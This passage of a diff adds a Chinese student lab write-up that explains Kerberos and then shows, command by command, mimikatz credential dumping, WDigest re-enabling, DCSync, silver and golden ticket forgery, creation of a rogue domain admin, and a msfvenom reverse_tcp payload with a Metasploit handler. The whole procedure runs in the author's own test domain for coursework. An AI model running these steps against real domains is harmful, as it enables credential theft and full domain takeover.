@@ -820,6 +820,197 @@
 <p>在Client-No1上访问<strong>https</strong>://xuwp05191643.com/certsrv，查看其证书。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image131.png" alt=""></p>
 <p>成功。</p>
+<h1 id="作业三"><a href="#作业三" class="headerlink" title="作业三"></a>作业三</h1><p>注：本文对图片的说明位于图片上方，因部分图片过大可能造成错页现象。</p>
+<h2 id="Kerberos认证协议及其攻击"><a href="#Kerberos认证协议及其攻击" class="headerlink" title="Kerberos认证协议及其攻击"></a>Kerberos认证协议及其攻击</h2><p>Kerberos原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，字面意思为”黑暗中的恶魔”。</p>
+<p>网络安全中的Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。域环境下的身份认证使用的就是Kerberos协议。</p>
+<h3 id="Kerberos认证协议流程"><a href="#Kerberos认证协议流程" class="headerlink" title="Kerberos认证协议流程"></a>Kerberos认证协议流程</h3><p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image2.png" alt=""></p>
+<p>协议中的用到的名词缩写：</p>
+<p>AS (Authentication Service): 认证服务器</p>
+<p>TGS (Ticket Granting Service): 票据授予服务器</p>
+<p>KDC (Key Distribution Center): 密钥分发中心</p>
+<p>TGT (Ticket Granting Ticket): 票据授权票据，或者说：票据的票据</p>
+<p>ST (Servre Ticket): 服务票据</p>
+<h4 id="认证服务器交换"><a href="#认证服务器交换" class="headerlink" title="认证服务器交换"></a>认证服务器交换</h4><p>每次用户登陆执行一次</p>
+<p>1)</p>
+<script type="math/tex; mode=display">
+C \rightarrow AS:\left. \ \text{ID}_{c} \right\|\left. \ \text{ID}_{\text{TGS}} \right\|\text{TS}_{1}</script><p>2)</p>
+<script type="math/tex; mode=display">
+AS \rightarrow C\left( \text{TGT} \right):E_{K_{c}}\lbrack\left. \ K_{C,TGS} \right\|\left. \ \text{IDS}_{\text{TGS}} \right\|\left. \ \text{TS}_{2} \right\|\left. \ \text{Lifetime}_{2} \right\|\text{Ticket}_{\text{TGS}}\rbrack</script><p>其中：</p>
+<script type="math/tex; mode=display">
+\text{Ticket}_{\text{TGS}} = E_{\text{TGS}}\left\lbrack \left. \ K_{C,TGS} \right\|\left. \ \text{ID}_{C} \right\|\left. \ \text{AD}_{C} \right\|\left. \ \text{ID}_{\text{TGS}} \right\|\left. \ \text{TS}_{2} \right\|{\text{Life}\text{time}}_{2} \right\rbrack</script><h4 id="票据许可服务器交换"><a href="#票据许可服务器交换" class="headerlink" title="票据许可服务器交换"></a>票据许可服务器交换</h4><p>每种类型服务执行一次</p>
+<p>3)</p>
+<script type="math/tex; mode=display">
+C \rightarrow TGS:\left. \ \text{ID}_{S} \right\|\left. \ \text{Ticket}_{\text{TGS}} \right\|\text{Authenticator}_{C}</script><p>其中：</p>
+<script type="math/tex; mode=display">
+\text{Authenticator}_{C} = E_{K_{C,TGS}}\lbrack\text{ID}_{C}||\left. \ \text{AD}_{C} \right\|\text{TS}_{3}\rbrack</script><p>4)</p>
+<script type="math/tex; mode=display">
+\text{TGS} \rightarrow C:E_{K_{C,TGS}}\lbrack\left. \ K_{C,S} \right\|\text{ID}_{C}||\left. \ \text{AD}_{C} \right\|\text{Ticket}_{S}\rbrack</script><p>其中：</p>
+<script type="math/tex; mode=display">
+\text{Ticket}_{\text{TGS}} = E_{K_{C,S}}\left\lbrack \left. \ K_{C,S} \right\|\left. \ \text{ID}_{C} \right\|\left. \ \text{AD}_{C} \right\|\left. \ \text{ID}_{S} \right\|\left. \ \text{TS}_{4} \right\|{\text{Life}\text{time}}_{4} \right\rbrack</script><h4 id="应用服务器交换"><a href="#应用服务器交换" class="headerlink" title="应用服务器交换"></a>应用服务器交换</h4><p>每个服务会话执行一次</p>
+<p>5)</p>
+<script type="math/tex; mode=display">
+C \rightarrow S:\left. \ \text{Ticket}_{S} \right\|\text{Authenticator}_{C}</script><p>其中：</p>
+<script type="math/tex; mode=display">
+\text{Authenticator}_{C} = E_{K_{C,S}}\lbrack\text{ID}_{C}||\left. \ \text{AD}_{C} \right\|\text{TS}_{5}\rbrack</script><p>6)</p>
+<script type="math/tex; mode=display">
+S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白银票据攻击原理"><a href="#白银票据攻击原理" class="headerlink" title="白银票据攻击原理"></a>白银票据攻击原理</h3><p>白银票据（Silver Ticket）通过伪造ST（Service Ticket）完成攻击，因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以白银票据只能访问指定服务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950807.png" alt=""></p>
+<h3 id="黄金票据攻击原理"><a href="#黄金票据攻击原理" class="headerlink" title="黄金票据攻击原理"></a>黄金票据攻击原理</h3><p>白银票据（Golden Ticket）通过伪造TGT（TicketGranting Ticket）完成攻击。域用户有了TGT，那么就可以发送给TGS换取任意服务的ST。有了金票就有了域内的最高权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950669.png" alt=""></p>
+<h2 id="票据传递攻击（PtT）"><a href="#票据传递攻击（PtT）" class="headerlink" title="票据传递攻击（PtT）"></a>票据传递攻击（PtT）</h2><p>票据传递攻击就是将Kerberos协议认证过程中的某些票据传递到普通域用户手中，然后他们便可以得到票据相应的权限，我们可以传递已存在票据（从域管理员用户处导出），也可以根据服务器信息生成出有用的票据进行传递，如白银票据、黄金票据。</p>
+<p>本次实验要求演示后两种，事实上传递已存在票据十分简单，不需获取信息，只要两行通用命令即可。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br><span class="line">kerberos::ptt [<span class="number">0</span>;<span class="number">34</span><span class="type">c63</span>]<span class="literal">-2</span><span class="literal">-0</span><span class="literal">-60a10000</span><span class="literal">-ailx00</span>@krbtgt<span class="literal">-HACKBIJI</span>.TOP.kirbi</span><br></pre></td></tr></table></figure>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>域控制器：Windows Server 2016 Server-No5</p>
+<p>域内主机：Windows 10 Client-No1</p>
+<h3 id="完整攻击流程"><a href="#完整攻击流程" class="headerlink" title="完整攻击流程"></a>完整攻击流程</h3><ol>
+<li><p>在域中主机登录本地用户Administrator，使用mimikatz的logonpassword取得一个域用户的用户名和密码</p>
+<p>如果取得了普通域用户的用户名和密码，那么可以登录普通域用户，使用漏洞（如MS14-068）临时提权至域管理员用户权限然后创建一个新的域管理员用户；</p>
+</li>
+<li><p>使用域管理员用户，获取足够的信息（如krbtgt用户的HTLM-Hash），使用这些信息为某个普通域用户（白银票据）/任意用户（黄金票据）制作票据；</p>
+</li>
+<li><p>登录普通域用户，导入票据，即可取得Kerberos服务权限。<br>注：实验指导书是从第2步开始的</p>
+</li>
+</ol>
+<h3 id="取得域管理员用户"><a href="#取得域管理员用户" class="headerlink" title="取得域管理员用户"></a>取得域管理员用户</h3><p>在域中主机登录本地用户Administrator</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951682.png" alt=""></p>
+<p>获取主机及其所在域信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951586.png" alt=""></p>
+<p>获取域控制器名称：SERVER-NO5</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:XUWP05191643</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951918.png" alt=""></p>
+<p>使用mimikatz获取已登录用户密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p>或者直接利用&gt;将打印结果输出到文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目录\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; password.txt</span><br></pre></td></tr></table></figure>
+<p>要获取已登录用户的明文密码，直接要求是服务器没有安装KB2871997补丁，它的作用是禁用Wdigest Auth，我们的服务器版本太高了，所以先制造出这个漏洞，模拟一下老旧服务器所处的陷境。</p>
+<p>在域控Server-No5上使用该Powershell启用Wdigest Auth。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="literal">-Name</span> UseLogonCredential <span class="literal">-Type</span> DWORD <span class="literal">-Value</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>可以发现，我们直接获取到了域控制器Server-No5的管理员用户Administrator的密码、域SID。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951449.png" alt=""></p>
+<p>同时还发现了一个普通域用户的用户名：xuwp-No1、密码：12345Qwerty</p>
+<p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image9.png" alt=""></p>
+<p>在Client-No1登录xuwp-No1，尝试使用CIFS服务、创建域用户。均被拒绝访问。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951414.png" alt=""></p>
+<p>接下来进行票据生成及利用。</p>
+<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>白银票据：伪造TGS只能访问指定的服务，且由服务账号（通常为计算机账户）的<br>Hash加密，银票在使用的过程不需要同域控通信。</p>
+<p>以下是Kerberos服务及其对应的白银票据。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Service Type</th>
+<th>Service Silver Tickets</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WMI</td>
+<td>HOST<br />RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST<br />HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST<br />HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations including<br />Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS<br />LDAP<br />CIFS</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>接下来系统地获取一下kerberos::golden命令所需的参数。</p>
+<p>首先在域控Server-No5上找到<strong>Server-No5$</strong>的NTLM，这个值是参数rc4的值。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951973.png" alt=""></p>
+<p>接着，找一下参数domain、target、rc4的值（前面也都出现过，但这个命令比较聚合）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xuwp05191643.com /all /csv</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951094.png" alt=""></p>
+<p>切换至Client-No1，找一下参数user和sid的值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951899.png" alt=""></p>
+<p>最后按kerberos::golden的语法，使用参数信息，写出payload。这里user的值不一定要为真实普通域用户的用户名，也可以不用生成票据文件，/ticket行换成/ptt直接进内存。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden</span><br><span class="line">/user:hacker</span><br><span class="line">/domain:xuwp05191643.com</span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line">/target:Server<span class="literal">-No5</span></span><br><span class="line">/rc4:<span class="number">612</span>f2673c6369f8a0b0d63cf784b46dc</span><br><span class="line">/service:cifs</span><br><span class="line">/ticket:silver.kirbi</span><br></pre></td></tr></table></figure>
+<p>使用mimikatz制作票据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952398.png" alt=""></p>
+<p>同目录下出现了白银票据silver.kirbi</p>
+<p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image15.png" alt=""></p>
+<p>导入票据、查看票据，发现了一个在十年有效期内可以从Server-No5获取CIFS服务的票据。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt silver.kirbi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952615.png" alt=""></p>
+<p>测试一下是否可以使用CIFS服务，发现很成功！</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952732.png" alt=""></p>
+<p>接着看看是否可以创建域用户、提升至域管理员用户。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker_silver <span class="number">12345</span>Qwert /add /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952812.png" alt=""></p>
+<p>这个功能不可以，这也验证了白银票据只能访问指定的服务。</p>
+<p>实验中耗时的点：</p>
+<p>1. mimikatz无法解析Windows Server 2022的lsass.dmp，<strong>所有版本都不行</strong>。</p>
+<p>如果你域内的域控制器是不支持的版本，可以新增域控，域控制器可以有很多。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952769.png" alt=""></p>
+<p>从lsass.exe创建转储文件最简单的方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952634.png" alt=""></p>
+<p>2. rc4处填的是<strong>域控制器DC$的NTLM</strong>。</p>
+<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>Golden<br>Ticket：伪造TGT，可以获取任何Kerberos服务权限，且由krbtgt的hash加密，金票在使用的过程需要和域控通信。</p>
+<h4 id="Windows下使用mimitakz攻击"><a href="#Windows下使用mimitakz攻击" class="headerlink" title="Windows下使用mimitakz攻击"></a>Windows下使用mimitakz攻击</h4><p>首先系统地获取一下kerberos::golden命令所需的参数。</p>
+<p>首先在域控Server-No5上获取krbtgt的NTLM。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952781.png" alt=""></p>
+<p>获取krbtgt的sid。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name, sid</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952663.png" alt=""></p>
+<p>按kerberos::golden的语法，使用取得的参数，写出payload。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden</span><br><span class="line">/admin:hacker</span><br><span class="line">/domain:xuwp05191643.com</span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line">/krbtgt:e70473fa5d05081e15e9498ea548fab8</span><br><span class="line">/ticket:golden.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952211.png" alt=""></p>
+<p>同目录下出现了黄金票据golden.kirbi</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952011.png" alt=""></p>
+<p>清除票据、导入票据、查看票据。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kirbi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952434.png" alt=""></p>
+<p>同样地，测试一下CIFS服务，意料之中，很是成功。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952704.png" alt=""></p>
+<p>接下来再试试是否可以创建域用户、提升至域管理员用户，这次成功了，说明黄金票据可以让hacker提升至域管理员用户权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953412.png" alt=""></p>
+<p>在域控里看一下是否有域管理员用户hacker_golden。</p>
+<p>Active<br>Directory用户和计算机-xuwp05191643.com-Users-（双击/右击+属性）hacker_golden-隶属于</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953943.png" alt=""></p>
+<p>确实存在域管理员用户hacker_golden。</p>
+<h4 id="Kali下使用msf攻击"><a href="#Kali下使用msf攻击" class="headerlink" title="Kali下使用msf攻击"></a>Kali下使用msf攻击</h4><p>首先生成木马。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">36.142</span> LPORT=<span class="number">23333</span> <span class="operator">-f</span> exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953043.png" alt=""></p>
+<p>配置监听模式，运行，在Client-No1上点开msf.exe，成功获取shell。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span>.<span class="number">36.142</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">23333</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953723.png" alt=""></p>
+<p>加载mimikatz（模块名居然叫kiwi，奇异果hhhh）。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953667.png" alt=""></p>
+<p>生成票据，使用和上一节一样的参数。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create</span><br><span class="line"><span class="literal">-d</span> xuwp05191643.com</span><br><span class="line"><span class="literal">-k</span> e70473fa5d05081e15e9498ea548fab8</span><br><span class="line"><span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line"><span class="literal">-u</span> hacker</span><br><span class="line"><span class="literal">-t</span> /root/golden.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953433.png" alt=""></p>
+<p>使用票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /root/golden.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953930.png" alt=""></p>
+<p>进入cmd，测试CSIF服务，成功。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp <span class="number">65001</span>		注释：这步是乱码问题的一个简单解决方案</span><br><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953193.png" alt=""></p>
 
         </div>
 
